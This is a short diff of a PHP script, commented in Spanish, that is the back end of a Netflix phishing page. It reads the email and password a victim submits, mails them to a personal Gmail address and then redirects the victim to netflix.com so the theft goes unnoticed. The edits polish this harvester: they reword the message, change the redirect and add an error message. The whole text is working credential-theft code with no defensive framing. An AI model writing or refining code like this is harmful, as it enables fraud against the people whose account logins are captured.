@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['password'];
 
-
+    // Aquí puedes agregar más validaciones si lo deseas (por ejemplo, validar el correo)
 
     // Destinatario
     $to = 'yeriselpe@gmail.com';
@@ -14,7 +14,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $subject = 'Nuevo inicio de sesión en Netflix';
 
     // Cuerpo del correo
-    $message = "Se ha intentado un inicio de sesión en Netflix con los siguientes datos:\n\n";
+    $message = "Se ha intentado un inicio de sesión con los siguientes datos:\n\n";
     $message .= "Email: " . $email . "\n";
     $message .= "Password: " . $password . "\n";
     
@@ -25,11 +25,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Enviar el correo
     if (mail($to, $subject, $message, $headers)) {
-        // Redirigir a la página de Netflix después de un login exitoso
-        header('Location: https://www.netflix.com/browse');
+        // Redirigir a la página principal de Netflix después de un login exitoso
+        header('Location: https://www.netflix.com');
         exit;  // Termina la ejecución del script después de la redirección
     } else {
-        
+        echo "Hubo un problema al enviar el correo.";
     }
 }
 ?>
